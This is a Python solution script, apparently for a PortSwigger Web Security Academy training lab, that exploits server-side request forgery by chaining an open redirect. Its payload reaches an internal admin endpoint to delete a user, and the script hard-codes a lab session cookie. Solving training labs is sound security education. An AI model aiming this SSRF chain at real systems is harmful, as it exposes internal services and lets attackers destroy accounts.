# https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
import requests


requests.packages.urllib3.disable_warnings()

scheme = "https://"
verify = False
host = "acbd1fdf1f693c3c80b31d5800b100af.web-security-academy.net"
path = "/product/stock"
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
url = scheme + host + path
cookies = {"session": "BIwkmowrAdbm8BjfqIGtc8Qdc9lR4OPR"}

payload = "/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos"
data = {"stockApi": payload}

requests.post(url, verify=verify, proxies=proxies, cookies=cookies, data=data)

# Normal post request
# stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

# Click next product button
# https://acbd1fdf1f693c3c80b31d5800b100af.web-security-academy.net/product/nextProduct?currentProductId=2&path=/product?productId=3

# Get a 302 response back with the following header:
# Location: /product?productId=3

# Redirect from the 302 causes a get request to the following url:
# https://acbd1fdf1f693c3c80b31d5800b100af.web-security-academy.net/product?productId=3

# Kind of hard to follow, but since the stock api requires a partial url, instead of being able to specify the host, we use an open redirect from the next product path to achieve the ssrf